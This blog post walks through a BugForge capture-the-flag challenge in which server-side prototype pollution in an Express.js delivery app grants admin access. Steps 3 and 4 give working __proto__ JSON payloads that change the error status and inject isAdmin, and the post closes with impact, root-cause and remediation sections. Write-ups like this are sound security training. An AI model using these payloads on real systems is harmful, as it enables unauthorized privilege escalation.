---
layout: post
title:  "BugForge - Weekly - Galaxy Dash"
date:   2026-01-04 20:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [prototype-pollution]
categories: [BugForge,weekly,galaxy-dash]
---

# Weekly - Galaxy Dash
><b>Vulnerabilities Covered:</b>
<br/>
Server-Side Prototype Pollution
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates a server-side prototype pollution vulnerability in an Express.js-based delivery platform. By exploiting an unsafe object merge operation in the team permissions update endpoint, an attacker can inject properties into the global object prototype using the __proto__ accessor. This allows the attacker to add an isAdmin property that propagates to all user objects lacking this property, effectively granting administrative privileges and bypassing access controls to restricted endpoints.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<a href="https://portswigger.net/web-security/prototype-pollution/server-side">PortSwigger - Prototype Pollution - Server Side</a>
<br/>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">MDN - Inheritance and the Prototype Chain</a>
<br/>
<br/>

## Solution

### Step 1 - Understanding Prototype Pollution

Prototype pollution is a vulnerability that allows an attacker to add or modify properties of an object's prototype. Unlike class-based languages (Python, Java, C++), JavaScript uses prototypal inheritance where all objects have a reference to a prototype, which in turn has its own prototype, forming a chain up to the root `Object.prototype`.

The vulnerability arises when objects are merged unsafely, allowing an attacker to inject properties into the global object prototype. Once polluted, all objects inheriting from that prototype will have the attacker-controlled property.

**Key concept:** If an object doesn't have a property defined directly on it, JavaScript will traverse up the prototype chain looking for that property. This is what makes prototype pollution dangerous - polluting a property on the prototype affects all objects that inherit from it.

---

### Step 2 - Application Reconnaissance

After creating a business account and logging in, the application reveals itself as an intergalactic delivery platform with the following features:

- **Deliveries**: Schedule and manage deliveries between locations
- **Team Management**: Add users with different permission levels

The team management feature allows creating users with various roles and updating their permissions. This functionality sends `PUT` requests to `/api/teams/{user_id}` with a JSON body containing permission properties.

Using directory fuzzing with a tool like `ffuf`, an additional endpoint was discovered

This revealed the `/api/admin` endpoint, which returns a `403 Forbidden` response with the message:

```json
{
  "error": "Admin access required",
  "log": "is admin check failed"
}
```

This error message indicates the application is checking for an `isAdmin` property on the user object.

---

### Step 3 - Confirming Prototype Pollution

The technology stack reveals the application is running **Express.js**, which is commonly susceptible to prototype pollution vulnerabilities.

The team permissions update endpoint (`PUT /api/teams/{user_id}`) accepts JSON with permission properties. To test for prototype pollution, a special payload was crafted using the `__proto__` accessor.

First, establish a baseline by sending invalid JSON to see the default error response:

```json
{invalid}
```

Response: `400 Bad Request`

Next, test for prototype pollution by attempting to modify the response status code (a technique credited to Gareth Heyes):

```json
{
  "viewDeliveries": true,
  "manageUsers": false,
  "manageOrganization": false,
  "__proto__": {
    "status": 510
  }
}
```

Response: `200 OK` - User permissions updated successfully

Now send the same invalid JSON again:

```json
{invalid}
```

Response: `510` instead of `400`

The status code changed from `400` to `510`, confirming the prototype pollution vulnerability. This technique is effective because it doesn't cause denial of service on the backend.

---

### Step 4 - Exploiting Prototype Pollution for Admin Access

With prototype pollution confirmed, the next step is to pollute the `isAdmin` property that the `/api/admin` endpoint checks for.

Send a request to the team permissions endpoint with the following payload:

```json
{
  "viewDeliveries": true,
  "manageUsers": false,
  "manageOrganization": false,
  "__proto__": {
    "isAdmin": true
  }
}
```

Response: `200 OK` - User permissions updated successfully

Now, when the application checks `user.isAdmin`:
1. The user object doesn't have `isAdmin` defined directly
2. JavaScript traverses up the prototype chain
3. It finds `isAdmin: true` on the polluted prototype
4. The check passes, granting admin access

Send a request to the admin endpoint:

```
GET /api/admin
```

Response: `200 OK` with the challenge flag

---

### Impact
- Complete bypass of administrative access controls
- All user objects without an explicitly defined `isAdmin` property inherit admin privileges
- Potential for persistent privilege escalation affecting all users
- Server-side state pollution that persists across requests
- Could lead to data exfiltration, unauthorized actions, or further exploitation

---

### Vulnerability Classification
- **OWASP Top 10:** A03:2021 - Injection
- **Vulnerability Type:** Server-Side Prototype Pollution
- **Attack Surface:** Team management API endpoint
- **CWE:** CWE-1321 - Improperly Controlled Modification of Object Prototype Attributes

---

### Root Cause
The application uses an unsafe object merge or assignment operation when processing user input in the team permissions update endpoint. This allows the `__proto__` property from user-controlled JSON to modify the prototype chain. The lack of property sanitization combined with JavaScript's prototypal inheritance model enables attackers to inject arbitrary properties that propagate to all objects.

---

### Remediation
- **Sanitize input:** Remove or reject `__proto__`, `constructor`, and `prototype` keys from user input before processing
- **Use null-prototype objects:** Create objects with `Object.create(null)` to break the prototype chain
- **Define all properties explicitly:** Ensure all objects have required properties defined directly, preventing prototype chain traversal
- **Use Object.hasOwn():** When checking for properties, use `Object.hasOwn(obj, 'prop')` instead of direct property access
- **Freeze prototypes:** Use `Object.freeze(Object.prototype)` to prevent modifications (may break some libraries)
- **Use schema validation:** Implement strict JSON schema validation that only allows expected properties
- **Update dependencies:** Many prototype pollution vulnerabilities exist in popular npm packages - keep dependencies updated

---
